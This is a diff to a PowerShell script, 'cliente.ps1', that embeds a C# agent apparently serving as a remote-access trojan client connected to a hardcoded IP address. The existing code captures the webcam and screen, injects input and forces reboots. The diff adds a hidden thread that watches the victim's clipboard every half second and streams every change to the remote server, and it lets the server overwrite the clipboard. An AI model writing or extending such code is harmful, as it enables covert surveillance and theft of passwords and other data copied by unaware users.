@@ -1,5 +1,4 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# + webcam (VfW) + reboot/shutdown/logoff + multi-monitor + clipboard get/set
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -316,6 +315,7 @@ if (-not ("R9KAgent" -as [type])) {
         static volatile bool isAudioRunning = false;
         static object writeLock = new object();
         static object capLock = new object();
+        static object clipLock = new object();
         static volatile bool isLocked = false;
         static volatile int targetX = 0;
         static volatile int targetY = 0;
@@ -328,6 +328,7 @@ if (-not ("R9KAgent" -as [type])) {
         static Graphics reuseGfx = null;
         static ImageCodecInfo jpgCodec = null;
         static EncoderParameters jpgParams = null;
+        static string lastClipboardText = "";
 
         static void EnsureJpegCodec(long quality) {
             if (jpgCodec == null) {
@@ -343,6 +344,7 @@ if (-not ("R9KAgent" -as [type])) {
             try { SetProcessDPIAware(); } catch {}
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
+            Thread tClip = new Thread(ClipboardWatcher); tClip.IsBackground = true; tClip.Start();
             Random rng = new Random();
 
             while (true) {
@@ -390,6 +392,31 @@ if (-not ("R9KAgent" -as [type])) {
             while (true) {
                 try { lock (writeLock) { myWriter.WriteLine("PING"); } } catch { break; }
                 Thread.Sleep(20000);
+            }
+        }
+
+        static void ClipboardWatcher() {
+            Thread.Sleep(2000);
+            string current = GetClipboardText();
+            lock (clipLock) { lastClipboardText = current ?? ""; }
+            
+            while (true) {
+                current = GetClipboardText();
+                if (current != null) {
+                    bool changed = false;
+                    lock (clipLock) {
+                        if (current != lastClipboardText) {
+                            lastClipboardText = current;
+                            changed = true;
+                        }
+                    }
+                    if (changed && globalWriter != null) {
+                        lock (writeLock) {
+                            try { globalWriter.WriteLine("CLIPSYNC:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(current))); } catch {}
+                        }
+                    }
+                }
+                Thread.Sleep(500);
             }
         }
 
@@ -576,7 +603,6 @@ if (-not ("R9KAgent" -as [type])) {
             t.SetApartmentState(ApartmentState.STA); t.IsBackground = true; t.Start();
         }
 
-        // ==== WEBCAM (VfW via avicap32) ====
         static string CaptureWebcam() {
             IntPtr capWnd = IntPtr.Zero;
             string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_" + Guid.NewGuid().ToString("N") + ".bmp");
@@ -615,7 +641,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        // ==== CLIPBOARD (Win32, sem STA) ====
         static string GetClipboardText() {
             for (int i = 0; i < 5; i++) {
                 if (OpenClipboard(IntPtr.Zero)) {
@@ -676,25 +701,23 @@ if (-not ("R9KAgent" -as [type])) {
                     return;
                 }
                 if (cmd == "monitor_reset") { currentScreen = 0; lock (writeLock) { myWriter.WriteLine("MONITOR:0/" + Screen.AllScreens.Length); } return; }
-                if (cmd == "clip_get") {
-                    string t = GetClipboardText();
-                    lock (writeLock) {
-                        if (t == null) myWriter.WriteLine("CLIPBOARD_ERR:open_failed");
-                        else myWriter.WriteLine("CLIPBOARD:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(t)));
-                    }
-                    return;
-                }
-                if (cmd.StartsWith("clip_set ")) {
+                
+                if (cmd.StartsWith("clip_sync ")) {
                     try {
-                        string b64 = cmd.Substring(9);
+                        string b64 = cmd.Substring(10);
                         string txt = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
-                        bool ok = SetClipboardText(txt);
-                        lock (writeLock) { myWriter.WriteLine(ok ? "CLIPBOARD_SET_OK" : "CLIPBOARD_SET_ERR"); }
-                    } catch {
-                        lock (writeLock) { myWriter.WriteLine("CLIPBOARD_SET_ERR"); }
-                    }
+                        bool changed = false;
+                        lock (clipLock) {
+                            if (txt != lastClipboardText) {
+                                lastClipboardText = txt;
+                                changed = true;
+                            }
+                        }
+                        if (changed) SetClipboardText(txt);
+                    } catch {}
                     return;
                 }
+
                 if (cmd == "reboot")   { lock (writeLock) { myWriter.WriteLine("REBOOTING"); } Thread.Sleep(200); Process.Start("shutdown", "/r /f /t 0"); return; }
                 if (cmd == "shutdown") { lock (writeLock) { myWriter.WriteLine("SHUTTING_DOWN"); } Thread.Sleep(200); Process.Start("shutdown", "/s /f /t 0"); return; }
                 if (cmd == "logoff")   { lock (writeLock) { myWriter.WriteLine("LOGGING_OFF"); } Thread.Sleep(200); Process.Start("shutdown", "/l /f"); return; }
